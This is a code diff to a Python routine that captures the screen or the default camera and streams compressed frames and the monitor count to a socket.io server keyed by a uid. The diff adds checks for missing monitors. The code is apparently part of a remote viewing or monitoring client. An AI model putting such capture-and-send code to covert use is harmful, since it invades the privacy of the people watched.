@@ -270,36 +270,39 @@ def run(data):
 
         if screen_or_camera == "screen":
             with mss.mss() as sct:
-                monitor = sct.monitors[screen_number]  # Capture the entire screen
+                if len(sct.monitors)-1 < 1:  # No monitors detected
+                    print("No monitors found. Skipping screen capture.")
+                else:
+                    monitor = sct.monitors[screen_number]  # Capture the entire screen
 
-                while not stop_event.is_set():
-                    current_time = time.time()
-                    if current_time - last_capture_time >= frame_interval:
-                        # Capture screenshot
-                        screenshot = sct.grab(monitor)
+                    while not stop_event.is_set():
+                        current_time = time.time()
+                        if current_time - last_capture_time >= frame_interval:
+                            # Capture screenshot
+                            screenshot = sct.grab(monitor)
 
-                        # Convert screenshot to PIL Image
-                        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
+                            # Convert screenshot to PIL Image
+                            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
 
-                        # Compress to JPEG with adjustable quality
-                        with io.BytesIO() as output:
-                            img.save(output, format="JPEG", quality=quality)
-                            jpeg_data = output.getvalue()
+                            # Compress to JPEG with adjustable quality
+                            with io.BytesIO() as output:
+                                img.save(output, format="JPEG", quality=quality)
+                                jpeg_data = output.getvalue()
 
-                        # Compress the JPEG data further using zlib
-                        compressed_data = zlib.compress(jpeg_data, level=9)
+                            # Compress the JPEG data further using zlib
+                            compressed_data = zlib.compress(jpeg_data, level=9)
 
-                        # Emit the compressed data
-                        sio.emit("screenshot", {"uid": uid, "image": compressed_data})
-                        print("Sent compressed screenshot")
+                            # Emit the compressed data
+                            sio.emit("screenshot", {"uid": uid, "image": compressed_data})
+                            print("Sent compressed screenshot")
 
-                        last_capture_time = current_time
+                            last_capture_time = current_time
 
-                    # Small sleep to prevent a tight loop
-                    time.sleep(0.001)
+                        # Small sleep to prevent a tight loop
+                        time.sleep(0.001)
         else:
             # Use OpenCV to capture from the camera instead of the screen
-            cap = cv2.VideoCapture(0)  # 0 is the default camera device index
+            cap = cv2.VideoCapture(0)  # 0 is the default camera device indexa
 
             if not cap.isOpened():
                 print("Error: Could not open camera.")
@@ -364,7 +367,10 @@ def run(data):
         while True:
             time.sleep(1)
             with mss.mss() as sct:
-                sio.emit('screen_count', { 'uid': data['uid'], 'screen_count': len(sct.monitors)-1 })
+                if len(sct.monitors)-1 < 1:  # No monitors detected
+                    print("No monitors found. Skipping screen capture.")
+                else:
+                    sio.emit('screen_count', { 'uid': data['uid'], 'screen_count': len(sct.monitors)-1 })
 
     # Start a new thread to run the emit_screen_count function
     threading.Thread(target=emit_screen_count, args=(data,)).start()
